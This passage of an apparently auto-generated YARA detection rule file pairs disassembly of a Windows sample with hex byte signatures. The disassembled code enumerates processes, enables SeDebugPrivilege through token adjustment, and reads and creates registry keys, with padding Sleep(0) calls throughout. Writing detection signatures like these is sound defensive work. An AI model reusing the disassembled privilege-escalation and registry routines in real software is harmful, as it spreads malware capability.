        .text:0x004079c1  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079c3  90               nop 
        .text:0x004079c4  90               nop 
        .text:0x004079c5  6a00             push 0
        .text:0x004079c7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079c9  8b4d08           mov ecx,dword [ebp + 8]
        .text:0x004079cc  8d4724           lea eax,dword [edi + 36]
        .text:0x004079cf  51               push ecx
        .text:0x004079d0  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004079d6  50               push eax
        .text:0x004079d7  e824caffff       call 0x00404400    ;sub_00404400(<0x00407996>,arg0)
        .text:0x004079dc  85c0             test eax,eax
        .text:0x004079de  6a00             push 0
        .text:0x004079e0  751e             jnz 0x00407a00
        .text:0x004079e2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079e4  6a00             push 0
        .text:0x004079e6  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079e8  8b5f08           mov ebx,dword [edi + 8]
        .text:0x004079eb  90               nop 
        .text:0x004079ec  57               push edi
        .text:0x004079ed  e8ee030000       call 0x00407de0    ;msvcrt.??3@YAXPAX@Z(<0x00407996>)
        .text:0x004079f2  83c404           add esp,4
        .text:0x004079f5  6a00             push 0
        .text:0x004079f7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004079f9  5f               pop edi
        .text:0x004079fa  8bc3             mov eax,ebx
        .text:0x004079fc  5e               pop esi
        .text:0x004079fd  5b               pop ebx
        .text:0x004079fe  5d               pop ebp
        .text:0x004079ff  c3               ret 
        .text:0x00407a00  loc_00407a00: [1 XREFS]
        .text:0x00407a00  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407a02  90               nop 
        .text:0x00407a03  57               push edi
        .text:0x00407a04  53               push ebx
        .text:0x00407a05  e8c8070000       call 0x004081d2    ;kernel32.Process32Next(<0x00407985>,<0x00407996>)
        .text:0x00407a0a  85c0             test eax,eax
        .text:0x00407a0c  7427             jz 0x00407a35
        .text:0x00407a0e  loc_00407a0e: [1 XREFS]
        .text:0x00407a0e  6a00             push 0
        .text:0x00407a10  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407a12  90               nop 
        .text:0x00407a13  8b5508           mov edx,dword [ebp + 8]
        .text:0x00407a16  8d4724           lea eax,dword [edi + 36]
        .text:0x00407a19  52               push edx
        .text:0x00407a1a  50               push eax
        .text:0x00407a1b  ff1560904000     call dword [0x00409060]    ;kernel32.lstrcmpiA(<0x00407996>,arg0)
        .text:0x00407a21  85c0             test eax,eax
        .text:0x00407a23  7431             jz 0x00407a56
        .text:0x00407a25  90               nop 
        .text:0x00407a26  6a00             push 0
        .text:0x00407a28  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407a2a  57               push edi
        .text:0x00407a2b  53               push ebx
        .text:0x00407a2c  e8a1070000       call 0x004081d2    ;kernel32.Process32Next(<0x00407985>,<0x00407996>)
        .text:0x00407a31  85c0             test eax,eax
        .text:0x00407a33  75d9             jnz 0x00407a0e
        .text:0x00407a35  loc_00407a35: [2 XREFS]
        .text:0x00407a35  6a00             push 0
        .text:0x00407a37  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407a39  90               nop 
        .text:0x00407a3a  53               push ebx
        .text:0x00407a3b  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x00407985>)
        .text:0x00407a41  90               nop 
        .text:0x00407a42  57               push edi
        .text:0x00407a43  e898030000       call 0x00407de0    ;msvcrt.??3@YAXPAX@Z(<0x00407996>)
        .text:0x00407a48  83c404           add esp,4
        .text:0x00407a4b  6a00             push 0
        .text:0x00407a4d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407a4f  5f               pop edi
        .text:0x00407a50  5e               pop esi
        .text:0x00407a51  33c0             xor eax,eax
        .text:0x00407a53  5b               pop ebx
        .text:0x00407a54  5d               pop ebp
        .text:0x00407a55  c3               ret 
        .text:0x00407a56  loc_00407a56: [1 XREFS]
        .text:0x00407a56  90               nop 
        .text:0x00407a57  6a00             push 0
        .text:0x00407a59  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407a5b  8b5f08           mov ebx,dword [edi + 8]
        .text:0x00407a5e  57               push edi
        .text:0x00407a5f  e87c030000       call 0x00407de0    ;msvcrt.??3@YAXPAX@Z(<0x00407996>)
        .text:0x00407a64  83c404           add esp,4
        .text:0x00407a67  6a00             push 0
        .text:0x00407a69  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407a6b  90               nop 
        .text:0x00407a6c  5f               pop edi
        .text:0x00407a6d  8bc3             mov eax,ebx
        .text:0x00407a6f  5e               pop esi
        .text:0x00407a70  5b               pop ebx
        .text:0x00407a71  5d               pop ebp
        .text:0x00407a72  c3               ret 
        */
        $c47 = { 55 8B EC 53 56 8B 35 ?? ?? ?? ?? 57 6A 00 FF D6 90 6A 00 6A 02 E8 ?? ?? ?? ?? 6A 00 8B D8 FF D6 90 68 28 01 00 00 E8 ?? ?? ?? ?? 83 C4 04 8B F8 6A 00 FF D6 90 6A 00 C7 07 28 01 00 00 FF D6 90 6A 00 FF D6 57 53 E8 ?? ?? ?? ?? 85 C0 74 ?? 6A 00 FF D6 90 90 6A 00 FF D6 8B 4D ?? 8D 47 ?? 51 8B 0D ?? ?? ?? ?? 50 E8 ?? ?? ?? ?? 85 C0 6A 00 75 ?? FF D6 6A 00 FF D6 8B 5F ?? 90 57 E8 ?? ?? ?? ?? 83 C4 04 6A 00 FF D6 5F 8B C3 5E 5B 5D C3 FF D6 90 57 53 E8 ?? ?? ?? ?? 85 C0 74 ?? 6A 00 FF D6 90 8B 55 ?? 8D 47 ?? 52 50 FF 15 ?? ?? ?? ?? 85 C0 74 ?? 90 6A 00 FF D6 57 53 E8 ?? ?? ?? ?? 85 C0 75 ?? 6A 00 FF D6 90 53 FF 15 ?? ?? ?? ?? 90 57 E8 ?? ?? ?? ?? 83 C4 04 6A 00 FF D6 5F 5E 33 C0 5B 5D C3 90 6A 00 FF D6 8B 5F ?? 57 E8 ?? ?? ?? ?? 83 C4 04 6A 00 FF D6 90 5F 8B C3 5E 5B 5D C3 }
        /*
function at 0x00403be0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - modify access privileges
        .text:0x00403be0  
        .text:0x00403be0  FUNC: int stdcall sub_00403be0( int arg0, int arg1, ) [4 XREFS] 
        .text:0x00403be0  
        .text:0x00403be0  Stack Variables: (offset from initial top of stack)
        .text:0x00403be0             8: int arg1
        .text:0x00403be0             4: int arg0
        .text:0x00403be0            -4: int local4
        .text:0x00403be0           -12: int local12
        .text:0x00403be0           -16: int local16
        .text:0x00403be0           -20: int local20
        .text:0x00403be0  
        .text:0x00403be0  83ec14           sub esp,20
        .text:0x00403be3  56               push esi
        .text:0x00403be4  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00403bea  57               push edi
        .text:0x00403beb  6a00             push 0
        .text:0x00403bed  bf01000000       mov edi,1
        .text:0x00403bf2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403bf4  8d442408         lea eax,dword [esp + 8]
        .text:0x00403bf8  50               push eax
        .text:0x00403bf9  6a28             push 40
        .text:0x00403bfb  ff15d8904000     call dword [0x004090d8]    ;kernel32.GetCurrentProcess()
        .text:0x00403c01  50               push eax
        .text:0x00403c02  ff1510904000     call dword [0x00409010]    ;advapi32.OpenProcessToken(kernel32.GetCurrentProcess(),40,local20)
        .text:0x00403c08  85c0             test eax,eax
        .text:0x00403c0a  750d             jnz 0x00403c19
        .text:0x00403c0c  50               push eax
        .text:0x00403c0d  ffd6             call esi    ;kernel32.Sleep(advapi32.OpenProcessToken(<0x00403bfb>,40,local20))
        .text:0x00403c0f  5f               pop edi
        .text:0x00403c10  33c0             xor eax,eax
        .text:0x00403c12  5e               pop esi
        .text:0x00403c13  83c414           add esp,20
        .text:0x00403c16  c20800           ret 8
        .text:0x00403c19  loc_00403c19: [1 XREFS]
        .text:0x00403c19  8b4c2424         mov ecx,dword [esp + 36]
        .text:0x00403c1d  6a00             push 0
        .text:0x00403c1f  f7d9             neg ecx
        .text:0x00403c21  1bc9             sbb ecx,ecx
        .text:0x00403c23  897c2410         mov dword [esp + 16],edi
        .text:0x00403c27  83e102           and ecx,2
        .text:0x00403c2a  894c241c         mov dword [esp + 28],ecx
        .text:0x00403c2e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403c30  8b442420         mov eax,dword [esp + 32]
        .text:0x00403c34  8d542410         lea edx,dword [esp + 16]
        .text:0x00403c38  52               push edx
        .text:0x00403c39  50               push eax
        .text:0x00403c3a  6a00             push 0
        .text:0x00403c3c  ff1514904000     call dword [0x00409014]    ;advapi32.LookupPrivilegeValueA(0,arg0,local12)
        .text:0x00403c42  6a00             push 0
        .text:0x00403c44  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403c46  8b542408         mov edx,dword [esp + 8]
        .text:0x00403c4a  6a00             push 0
        .text:0x00403c4c  6a00             push 0
        .text:0x00403c4e  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00403c52  6a10             push 16
        .text:0x00403c54  51               push ecx
        .text:0x00403c55  6a00             push 0
        .text:0x00403c57  52               push edx
        .text:0x00403c58  ff1518904000     call dword [0x00409018]    ;advapi32.AdjustTokenPrivileges(0xfefefefe,0,local16,16,0,0)
        .text:0x00403c5e  6a00             push 0
        .text:0x00403c60  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403c62  ff15d4904000     call dword [0x004090d4]    ;ntdll.RtlGetLastWin32Error()
        .text:0x00403c68  85c0             test eax,eax
        .text:0x00403c6a  7406             jz 0x00403c72
        .text:0x00403c6c  6a00             push 0
        .text:0x00403c6e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403c70  33ff             xor edi,edi
        .text:0x00403c72  loc_00403c72: [1 XREFS]
        .text:0x00403c72  6a00             push 0
        .text:0x00403c74  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403c76  8b442408         mov eax,dword [esp + 8]
        .text:0x00403c7a  50               push eax
        .text:0x00403c7b  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(0xfefefefe)
        .text:0x00403c81  8bc7             mov eax,edi
        .text:0x00403c83  5f               pop edi
        .text:0x00403c84  5e               pop esi
        .text:0x00403c85  83c414           add esp,20
        .text:0x00403c88  c20800           ret 8
        */
        $c48 = { 83 EC 14 56 8B 35 ?? ?? ?? ?? 57 6A 00 BF 01 00 00 00 FF D6 8D 44 24 ?? 50 6A 28 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 85 C0 75 ?? 50 FF D6 5F 33 C0 5E 83 C4 14 C2 08 00 8B 4C 24 ?? 6A 00 F7 D9 1B C9 89 7C 24 ?? 83 E1 02 89 4C 24 ?? FF D6 8B 44 24 ?? 8D 54 24 ?? 52 50 6A 00 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 54 24 ?? 6A 00 6A 00 8D 4C 24 ?? 6A 10 51 6A 00 52 FF 15 ?? ?? ?? ?? 6A 00 FF D6 FF 15 ?? ?? ?? ?? 85 C0 74 ?? 6A 00 FF D6 33 FF 6A 00 FF D6 8B 44 24 ?? 50 FF 15 ?? ?? ?? ?? 8B C7 5F 5E 83 C4 14 C2 08 00 }
        /*
function at 0x004063d0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - modify access privileges
        .text:0x004063d0  
        .text:0x004063d0  FUNC: int msfastcall sub_004063d0( int ecx, int edx, ) [2 XREFS] 
        .text:0x004063d0  
        .text:0x004063d0  Stack Variables: (offset from initial top of stack)
        .text:0x004063d0            -4: int local4
        .text:0x004063d0            -5: int local5
        .text:0x004063d0            -6: int local6
        .text:0x004063d0            -7: int local7
        .text:0x004063d0            -8: int local8
        .text:0x004063d0            -9: int local9
        .text:0x004063d0           -10: int local10
        .text:0x004063d0           -11: int local11
        .text:0x004063d0           -12: int local12
        .text:0x004063d0           -13: int local13
        .text:0x004063d0           -14: int local14
        .text:0x004063d0           -15: int local15
        .text:0x004063d0           -16: int local16
        .text:0x004063d0           -17: int local17
        .text:0x004063d0           -18: int local18
        .text:0x004063d0           -19: int local19
        .text:0x004063d0           -20: int local20
        .text:0x004063d0           -24: int local24
        .text:0x004063d0           -32: int local32
        .text:0x004063d0           -36: int local36
        .text:0x004063d0           -40: int local40
        .text:0x004063d0  
        .text:0x004063d0  83ec28           sub esp,40
        .text:0x004063d3  56               push esi
        .text:0x004063d4  8b3578904000     mov esi,dword [0x00409078]
        .text:0x004063da  57               push edi
        .text:0x004063db  6a00             push 0
        .text:0x004063dd  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063df  ff15d8904000     call dword [0x004090d8]    ;kernel32.GetCurrentProcess()
        .text:0x004063e5  6a00             push 0
        .text:0x004063e7  8bf8             mov edi,eax
        .text:0x004063e9  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063eb  8d442408         lea eax,dword [esp + 8]
        .text:0x004063ef  50               push eax
        .text:0x004063f0  6a28             push 40
        .text:0x004063f2  57               push edi
        .text:0x004063f3  ff1510904000     call dword [0x00409010]    ;advapi32.OpenProcessToken(kernel32.GetCurrentProcess(),40,local40)
        .text:0x004063f9  85c0             test eax,eax
        .text:0x004063fb  0f84d8000000     jz 0x004064d9
        .text:0x00406401  6a00             push 0
        .text:0x00406403  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406405  6a00             push 0
        .text:0x00406407  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406409  6a00             push 0
        .text:0x0040640b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040640d  6a00             push 0
        .text:0x0040640f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406411  6a00             push 0
        .text:0x00406413  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406415  6a00             push 0
        .text:0x00406417  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406419  b169             mov cl,105
        .text:0x0040641b  b267             mov dl,103
        .text:0x0040641d  884c2425         mov byte [esp + 37],cl
        .text:0x00406421  884c2427         mov byte [esp + 39],cl
        .text:0x00406425  88542422         mov byte [esp + 34],dl
        .text:0x00406429  8854242a         mov byte [esp + 42],dl
        .text:0x0040642d  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00406431  8d54241c         lea edx,dword [esp + 28]
        .text:0x00406435  51               push ecx
        .text:0x00406436  b065             mov al,101
        .text:0x00406438  52               push edx
        .text:0x00406439  6a00             push 0
        .text:0x0040643b  c644242853       mov byte [esp + 40],83
        .text:0x00406440  88442429         mov byte [esp + 41],al
        .text:0x00406444  c644242a44       mov byte [esp + 42],68
        .text:0x00406449  8844242b         mov byte [esp + 43],al
        .text:0x0040644d  c644242c62       mov byte [esp + 44],98
        .text:0x00406452  c644242d75       mov byte [esp + 45],117
        .text:0x00406457  c644242f50       mov byte [esp + 47],80
        .text:0x0040645c  c644243072       mov byte [esp + 48],114
        .text:0x00406461  c644243276       mov byte [esp + 50],118
        .text:0x00406466  c64424346c       mov byte [esp + 52],108
        .text:0x0040646b  88442435         mov byte [esp + 53],al
        .text:0x0040646f  88442437         mov byte [esp + 55],al
        .text:0x00406473  c644243800       mov byte [esp + 56],0
        .text:0x00406478  ff1514904000     call dword [0x00409014]    ;advapi32.LookupPrivilegeValueA(0,local20,local32)
        .text:0x0040647e  85c0             test eax,eax
        .text:0x00406480  7440             jz 0x004064c2
        .text:0x00406482  6a00             push 0
        .text:0x00406484  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406486  6a00             push 0
        .text:0x00406488  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040648a  6a00             push 0
        .text:0x0040648c  c744241001000000 mov dword [esp + 16],1
        .text:0x00406494  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406496  6a00             push 0
        .text:0x00406498  c744241c02000000 mov dword [esp + 28],2
        .text:0x004064a0  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004064a2  6a00             push 0
        .text:0x004064a4  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004064a6  8b4c2408         mov ecx,dword [esp + 8]
        .text:0x004064aa  6a00             push 0
        .text:0x004064ac  6a00             push 0
        .text:0x004064ae  8d442414         lea eax,dword [esp + 20]
        .text:0x004064b2  6a00             push 0
        .text:0x004064b4  50               push eax
        .text:0x004064b5  6a00             push 0
        .text:0x004064b7  51               push ecx
        .text:0x004064b8  ff1518904000     call dword [0x00409018]    ;advapi32.AdjustTokenPrivileges(0xfefefefe,0,local36,0,0,0)
        .text:0x004064be  6a00             push 0
        .text:0x004064c0  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004064c2  loc_004064c2: [1 XREFS]
        .text:0x004064c2  6a00             push 0
        .text:0x004064c4  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004064c6  6a00             push 0
        .text:0x004064c8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004064ca  8b542408         mov edx,dword [esp + 8]
        .text:0x004064ce  52               push edx
        .text:0x004064cf  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(0xfefefefe)
        .text:0x004064d5  6a00             push 0
        .text:0x004064d7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004064d9  loc_004064d9: [1 XREFS]
        .text:0x004064d9  6a00             push 0
        .text:0x004064db  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004064dd  5f               pop edi
        .text:0x004064de  5e               pop esi
        .text:0x004064df  83c428           add esp,40
        .text:0x004064e2  c3               ret 
        */
        $c49 = { 83 EC 28 56 8B 35 ?? ?? ?? ?? 57 6A 00 FF D6 FF 15 ?? ?? ?? ?? 6A 00 8B F8 FF D6 8D 44 24 ?? 50 6A 28 57 FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 6A 00 FF D6 6A 00 FF D6 6A 00 FF D6 6A 00 FF D6 B1 69 B2 67 88 4C 24 ?? 88 4C 24 ?? 88 54 24 ?? 88 54 24 ?? 8D 4C 24 ?? 8D 54 24 ?? 51 B0 65 52 6A 00 C6 44 24 ?? 53 88 44 24 ?? C6 44 24 ?? 44 88 44 24 ?? C6 44 24 ?? 62 C6 44 24 ?? 75 C6 44 24 ?? 50 C6 44 24 ?? 72 C6 44 24 ?? 76 C6 44 24 ?? 6C 88 44 24 ?? 88 44 24 ?? C6 44 24 ?? 00 FF 15 ?? ?? ?? ?? 85 C0 74 ?? 6A 00 FF D6 6A 00 FF D6 6A 00 C7 44 24 ?? 01 00 00 00 FF D6 6A 00 C7 44 24 ?? 02 00 00 00 FF D6 6A 00 FF D6 8B 4C 24 ?? 6A 00 6A 00 8D 44 24 ?? 6A 00 50 6A 00 51 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 6A 00 FF D6 8B 54 24 ?? 52 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 5F 5E 83 C4 28 C3 }
        /*
function at 0x00404a90@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - query or enumerate registry value
        .text:0x00404a90  
        .text:0x00404a90  FUNC: int cdecl sub_00404a90( int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, int arg7, ) [2 XREFS] 
        .text:0x00404a90  
        .text:0x00404a90  Stack Variables: (offset from initial top of stack)
        .text:0x00404a90            32: int arg7
        .text:0x00404a90            28: int arg6
        .text:0x00404a90            24: int arg5
        .text:0x00404a90            20: int arg4
        .text:0x00404a90            16: int arg3
        .text:0x00404a90            12: int arg2
        .text:0x00404a90             8: int arg1
        .text:0x00404a90             4: int arg0
        .text:0x00404a90            -8: int local8
        .text:0x00404a90           -20: int local20
        .text:0x00404a90           -32: int local32
        .text:0x00404a90           -36: int local36
        .text:0x00404a90          -295: int local295
        .text:0x00404a90          -296: int local296
        .text:0x00404a90          -592: int local592
        .text:0x00404a90  
        .text:0x00404a90  55               push ebp
        .text:0x00404a91  8bec             mov ebp,esp
        .text:0x00404a93  6aff             push 0xffffffff
        .text:0x00404a95  6898924000       push 0x00409298
        .text:0x00404a9a  68907e4000       push 0x00407e90
        .text:0x00404a9f  64a100000000     fs: mov eax,dword [0x00000000]
        .text:0x00404aa5  50               push eax
        .text:0x00404aa6  64892500000000   fs: mov dword [0x00000000],esp
        .text:0x00404aad  81ec3c020000     sub esp,572
        .text:0x00404ab3  53               push ebx
        .text:0x00404ab4  56               push esi
        .text:0x00404ab5  57               push edi
        .text:0x00404ab6  33db             xor ebx,ebx
        .text:0x00404ab8  895de0           mov dword [ebp - 32],ebx
        .text:0x00404abb  889ddcfeffff     mov byte [ebp - 292],bl
        .text:0x00404ac1  b940000000       mov ecx,64
        .text:0x00404ac6  33c0             xor eax,eax
        .text:0x00404ac8  8dbdddfeffff     lea edi,dword [ebp - 291]
        .text:0x00404ace  f3ab             rep: stosd 
        .text:0x00404ad0  66ab             stosd 
        .text:0x00404ad2  aa               stosb 
        .text:0x00404ad3  53               push ebx
        .text:0x00404ad4  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00404ada  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404adc  895dfc           mov dword [ebp - 4],ebx
        .text:0x00404adf  53               push ebx
        .text:0x00404ae0  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404ae2  8d85b4fdffff     lea eax,dword [ebp - 588]
        .text:0x00404ae8  50               push eax
        .text:0x00404ae9  6819000200       push 0x00020019
        .text:0x00404aee  53               push ebx
        .text:0x00404aef  8b4d0c           mov ecx,dword [ebp + 12]
        .text:0x00404af2  51               push ecx
        .text:0x00404af3  8b5508           mov edx,dword [ebp + 8]
        .text:0x00404af6  52               push edx
        .text:0x00404af7  ff1504904000     call dword [0x00409004]    ;advapi32.RegOpenKeyExA(arg0,arg1,0,0x00020019,local592)
        .text:0x00404afd  85c0             test eax,eax
        .text:0x00404aff  53               push ebx
        .text:0x00404b00  740b             jz 0x00404b0d
        .text:0x00404b02  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404b04  c745e0ffffffff   mov dword [ebp - 32],0xffffffff
        .text:0x00404b0b  eb74             jmp 0x00404b81
        .text:0x00404b0d  loc_00404b0d: [1 XREFS]
        .text:0x00404b0d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404b0f  395d24           cmp dword [ebp + 36],ebx
        .text:0x00404b12  756d             jnz 0x00404b81
        .text:0x00404b14  8b4514           mov eax,dword [ebp + 20]
        .text:0x00404b17  3bc3             cmp eax,ebx
        .text:0x00404b19  7666             jbe 0x00404b81
        .text:0x00404b1b  83f802           cmp eax,2
        .text:0x00404b1e  7761             ja 0x00404b81
        .text:0x00404b20  53               push ebx
        .text:0x00404b21  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404b23  c745e404010000   mov dword [ebp - 28],260
        .text:0x00404b2a  53               push ebx
        .text:0x00404b2b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404b2d  8d45e4           lea eax,dword [ebp - 28]
        .text:0x00404b30  50               push eax
        .text:0x00404b31  8d8ddcfeffff     lea ecx,dword [ebp - 292]
        .text:0x00404b37  51               push ecx
        .text:0x00404b38  8d5514           lea edx,dword [ebp + 20]
        .text:0x00404b3b  52               push edx
        .text:0x00404b3c  53               push ebx
        .text:0x00404b3d  8b4510           mov eax,dword [ebp + 16]
        .text:0x00404b40  50               push eax
        .text:0x00404b41  8b8db4fdffff     mov ecx,dword [ebp - 588]
        .text:0x00404b47  51               push ecx
        .text:0x00404b48  ff1508904000     call dword [0x00409008]    ;advapi32.RegQueryValueExA(0xfefefefe,arg2,0,arg3,local296,local32)
        .text:0x00404b4e  85c0             test eax,eax
        .text:0x00404b50  752f             jnz 0x00404b81
        .text:0x00404b52  53               push ebx
        .text:0x00404b53  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404b55  8d95dcfeffff     lea edx,dword [ebp - 292]
        .text:0x00404b5b  52               push edx
        .text:0x00404b5c  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00404b62  e859f9ffff       call 0x004044c0    ;sub_004044c0(0,local296)
        .text:0x00404b67  50               push eax
        .text:0x00404b68  8b4518           mov eax,dword [ebp + 24]
        .text:0x00404b6b  50               push eax
        .text:0x00404b6c  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00404b72  e8f9fbffff       call 0x00404770    ;sub_00404770(arg4,sub_004044c0(0,local296))
        .text:0x00404b77  53               push ebx
        .text:0x00404b78  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404b7a  c745e001000000   mov dword [ebp - 32],1
        .text:0x00404b81  loc_00404b81: [5 XREFS]
        .text:0x00404b81  c745fcffffffff   mov dword [ebp - 4],0xffffffff
        .text:0x00404b88  e81f000000       call 0x00404bac    ;sub_00404bac()
        .text:0x00404b8d  53               push ebx
        .text:0x00404b8e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00404b90  8b45e0           mov eax,dword [ebp - 32]
        .text:0x00404b93  8b4df0           mov ecx,dword [ebp - 16]
        .text:0x00404b96  64890d00000000   fs: mov dword [0x00000000],ecx
        .text:0x00404b9d  5f               pop edi
        .text:0x00404b9e  5e               pop esi
        .text:0x00404b9f  5b               pop ebx
        .text:0x00404ba0  8be5             mov esp,ebp
        .text:0x00404ba2  5d               pop ebp
        .text:0x00404ba3  c3               ret 
        */
        $c50 = { 55 8B EC 6A FF 68 98 92 40 00 68 90 7E 40 00 64 A1 ?? ?? ?? ?? 50 64 89 25 ?? ?? ?? ?? 81 EC 3C 02 00 00 53 56 57 33 DB 89 5D ?? 88 9D ?? ?? ?? ?? B9 40 00 00 00 33 C0 8D BD ?? ?? ?? ?? F3 AB 66 AB AA 53 8B 35 ?? ?? ?? ?? FF D6 89 5D ?? 53 FF D6 8D 85 ?? ?? ?? ?? 50 68 19 00 02 00 53 8B 4D ?? 51 8B 55 ?? 52 FF 15 ?? ?? ?? ?? 85 C0 53 74 ?? FF D6 C7 45 ?? FF FF FF FF EB ?? FF D6 39 5D ?? 75 ?? 8B 45 ?? 3B C3 76 ?? 83 F8 02 77 ?? 53 FF D6 C7 45 ?? 04 01 00 00 53 FF D6 8D 45 ?? 50 8D 8D ?? ?? ?? ?? 51 8D 55 ?? 52 53 8B 45 ?? 50 8B 8D ?? ?? ?? ?? 51 FF 15 ?? ?? ?? ?? 85 C0 75 ?? 53 FF D6 8D 95 ?? ?? ?? ?? 52 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 50 8B 45 ?? 50 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 53 FF D6 C7 45 ?? 01 00 00 00 C7 45 ?? FF FF FF FF E8 ?? ?? ?? ?? 53 FF D6 8B 45 ?? 8B 4D ?? 64 89 0D ?? ?? ?? ?? 5F 5E 5B 8B E5 5D C3 }
        /*
function at 0x00404be0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - set registry value
        .text:0x00404be0  
        .text:0x00404be0  FUNC: int cdecl sub_00404be0( int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, ) [6 XREFS] 
        .text:0x00404be0  
        .text:0x00404be0  Stack Variables: (offset from initial top of stack)
        .text:0x00404be0            28: int arg6
        .text:0x00404be0            24: int arg5
        .text:0x00404be0            20: int arg4
        .text:0x00404be0            16: int arg3
        .text:0x00404be0            12: int arg2
        .text:0x00404be0             8: int arg1
        .text:0x00404be0             4: int arg0
        .text:0x00404be0            -8: int local8
        .text:0x00404be0           -20: int local20
        .text:0x00404be0           -32: int local32
        .text:0x00404be0           -36: int local36
        .text:0x00404be0           -40: int local40
        .text:0x00404be0  
        .text:0x00404be0  55               push ebp
        .text:0x00404be1  8bec             mov ebp,esp
        .text:0x00404be3  6aff             push 0xffffffff
        .text:0x00404be5  68a8924000       push 0x004092a8
        .text:0x00404bea  68907e4000       push 0x00407e90
        .text:0x00404bef  64a100000000     fs: mov eax,dword [0x00000000]
        .text:0x00404bf5  50               push eax
        .text:0x00404bf6  64892500000000   fs: mov dword [0x00000000],esp
        .text:0x00404bfd  83ec14           sub esp,20
        .text:0x00404c00  53               push ebx
        .text:0x00404c01  56               push esi
        .text:0x00404c02  57               push edi
        .text:0x00404c03  33db             xor ebx,ebx
        .text:0x00404c05  895de4           mov dword [ebp - 28],ebx
        .text:0x00404c08  895dfc           mov dword [ebp - 4],ebx
        .text:0x00404c0b  8b4520           mov eax,dword [ebp + 32]
        .text:0x00404c0e  2bc3             sub eax,ebx
        .text:0x00404c10  7405             jz 0x00404c17
        .text:0x00404c12  48               dec eax
        .text:0x00404c13  7425             jz 0x00404c3a
        .text:0x00404c15  eb78             jmp 0x00404c8f
        .text:0x00404c17  loc_00404c17: [1 XREFS]
        .text:0x00404c17  8d45e0           lea eax,dword [ebp - 32]
        .text:0x00404c1a  50               push eax
        .text:0x00404c1b  8d4ddc           lea ecx,dword [ebp - 36]
        .text:0x00404c1e  51               push ecx
        .text:0x00404c1f  53               push ebx
        .text:0x00404c20  683f000f00       push 0x000f003f
        .text:0x00404c25  53               push ebx
        .text:0x00404c26  53               push ebx
        .text:0x00404c27  53               push ebx
        .text:0x00404c28  8b550c           mov edx,dword [ebp + 12]
        .text:0x00404c2b  52               push edx
        .text:0x00404c2c  8b4508           mov eax,dword [ebp + 8]
        .text:0x00404c2f  50               push eax
        .text:0x00404c30  ff151c904000     call dword [0x0040901c]    ;advapi32.RegCreateKeyExA(arg0,arg1,0,0,0,0x000f003f,0,local40,local36)
        .text:0x00404c36  85c0             test eax,eax
        .text:0x00404c38  7555             jnz 0x00404c8f
        .text:0x00404c3a  loc_00404c3a: [1 XREFS]
